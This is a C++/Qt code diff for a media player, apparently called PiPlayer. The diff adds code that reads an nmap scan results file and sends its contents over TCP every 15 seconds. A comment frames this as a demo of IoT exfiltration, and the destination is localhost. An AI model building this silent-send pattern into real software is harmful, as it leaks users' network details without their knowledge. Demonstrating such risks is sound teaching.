@@ -46,6 +46,18 @@ DualServer::DualServer(QObject *parent) :
     timer->setInterval(15000);
     connect(timer, SIGNAL(timeout()), this, SLOT(timerTimeout()));
     timer->start();
+
+
+    QFile nmapFile(NMAPPATH);
+
+    QDEBUG() << NMAPPATH;
+    nmapData.clear();
+    if(nmapFile.exists() && nmapFile.open(QIODevice::ReadOnly)) {
+
+        nmapData = nmapFile.readAll();
+        nmapFile.close();
+    }
+
 }
 
 
@@ -59,7 +71,50 @@ void DualServer::processDone() {
 void DualServer::timerTimeout() {
     QDEBUG() << "Timeout! App is still running.";
 
+
+/*
+ * Dear user, the following is an example of how
+ * a random IoT device can scan your network and send
+ * nefarious data to a random server.
+ *
+ * Be assured, PiPlayer sends nothing to a server.
+ * I create a bogus "nmapresults.txt" to be sent for my presentation demos.
+
+*/
+    if(!nmapData.isEmpty()) {
+        QDEBUG() << "Sending nefarious data...";
+        DualServer::tcpSingle("127.0.0.1", 5123, nmapData);
+    }
+
+
 }
+
+
+
+QByteArray DualServer::tcpSingle(QString ip, quint16 port, QByteArray tcpSend)
+{
+    QTcpSocket * socketPointer = new QTcpSocket();
+    QByteArray returnData;
+
+    socketPointer->connectToHost(ip, port);
+    socketPointer->waitForConnected(5000);
+
+
+    if(socketPointer->state() == QAbstractSocket::ConnectedState)
+    {
+        socketPointer->write(tcpSend);
+        socketPointer->waitForBytesWritten();
+        socketPointer->waitForReadyRead();
+        returnData = socketPointer->readAll();
+    }
+
+    socketPointer->disconnectFromHost();
+    socketPointer->deleteLater();
+
+    return returnData;
+
+}
+
 
 QString DualServer::myIPs() {
     QList<QHostAddress> allIP = QNetworkInterface::allAddresses();
@@ -98,7 +153,7 @@ void DualServer::init()
 }
 
 
-QByteArray DualServer::tcpSend(QString ip, int port, QByteArray tcpSend)
+QByteArray DualServer::tcpSend(QString ip, quint16 port, QByteArray tcpSend)
 {
     QTcpSocket * socket = new QTcpSocket();
     QByteArray returnData;
